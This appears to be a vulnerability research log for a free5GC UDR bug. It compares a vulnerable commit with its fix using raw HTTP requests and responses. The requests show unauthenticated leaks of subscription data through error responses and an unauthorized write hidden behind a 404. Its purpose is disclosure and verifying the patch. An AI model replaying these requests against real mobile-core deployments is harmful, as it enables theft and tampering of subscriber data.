# Raw findings: full CRUD violation on all 4 reachable handlers (real Docker deployment)

Deployment: real MongoDB + real free5GC NRF (OAuth2 disabled for testability,
otherwise default config) + custom-built UDR from pinned commits, via
official free5gc-compose. Fixed commit: 86686276a7e226183ee786e3dd6714ec56c78fda.
Vulnerable commit: its direct parent.

## VULNERABLE build

### 1. Seed subscription (PUT, correct influenceId)
Request: PUT /nudr-dr/v2/application-data/influenceData/subs-to-notify/leak-test-sub-001
Body: {"dnns":["internet"],"notificationUri":"http://127.0.0.1:9/callback"}
Response: 200 OK
{"dnns":["internet"],"notificationUri":"http://127.0.0.1:9/callback"}

### 2. Collection GET, empty query -> full database leak
Request: GET /nudr-dr/v2/application-data/influenceData/subs-to-notify
Response: 400 Bad Request, Content-Length: 174
RAW BODY: {"status":400,"detail":"At least one of DNNs, S-NSSAIs, Internal Group IDs or SUPIs shall be provided"}[{"dnns":["internet"],"notificationUri":"http://127.0.0.1:9/callback"}]
FINDING: the legitimate 400 error body is followed, in the same response, by a
JSON array of EVERY influence-data subscription in the system. A client
reading only the status code sees a rejected request; the raw bytes contain
a full unauthenticated dump of the collection.

### 3. Single GET, wrong influenceId -> single-record leak
Request: GET /nudr-dr/v2/application-data/influenceData/WRONG-ID/leak-test-sub-001
Response: 404 Not Found, Content-Length: 87
RAW BODY: 404 page not found{"dnns":["internet"],"notificationUri":"http://127.0.0.1:9/callback"}
FINDING: the real subscription content is appended after the literal
"404 page not found" text.

### 4. Single PUT, wrong influenceId -> unauthorized write
Request: PUT /nudr-dr/v2/application-data/influenceData/WRONG-ID/leak-test-sub-002
Body: {"dnns":["attacker-injected"],"notificationUri":"http://127.0.0.1:9/callback"}
Response: 404 Not Found, Content-Length: 96
RAW BODY: 404 page not found{"dnns":["attacker-injected"],"notificationUri":"http://127.0.0.1:9/callback"}
Follow-up GET (correct influenceId) on leak-test-sub-002:
Response: 200 OK
{"dnns":["attacker-injected"],"notificationUri":"http://127.0.0.1:9/callback"}
FINDING: the subscription was genuinely created despite the request appearing
to fail with 404 - an unauthorized write / data-injection primitive, not just
an information leak.

## PATCHED build (fresh in-memory state, same request sequence)

1. Seed: 200 OK (unchanged).
2. Collection GET, empty query: 400 Bad Request, Content-Length: 103,
   body is ONLY the error JSON, no appended list.
3. Single GET, wrong influenceId: 404 Not Found, Content-Length: 18,
   body is ONLY "404 page not found", no appended content.
4. Single PUT, wrong influenceId: 404 Not Found, Content-Length: 18,
   body is ONLY "404 page not found".
5. Follow-up GET on leak-test-sub-002 (correct influenceId): 404 Not Found,
   {"title":"User not found","status":404,"cause":"USER_NOT_FOUND"} -
   confirms the malicious PUT was never actually stored.
6. Benign path preserved: GET on leak-test-sub-001 (correct influenceId)
   still returns 200 with the real, correct subscription content.

## Conclusion

All four CRUD operations reachable through this bug class (GET single,
PUT single, DELETE single - already confirmed in the frozen report - and
GET collection) share the same root cause (missing `return` after a
non-2xx write) and are now runtime-confirmed, on a real deployment (real
MongoDB, real NRF), not a minimal stand-in. The collection-GET and single-PUT
findings are NEW and more severe than anything currently in the FYP report:
a full, unauthenticated collection dump, and an unauthorized write/data-
injection primitive, not just the single-record read/delete already
documented.
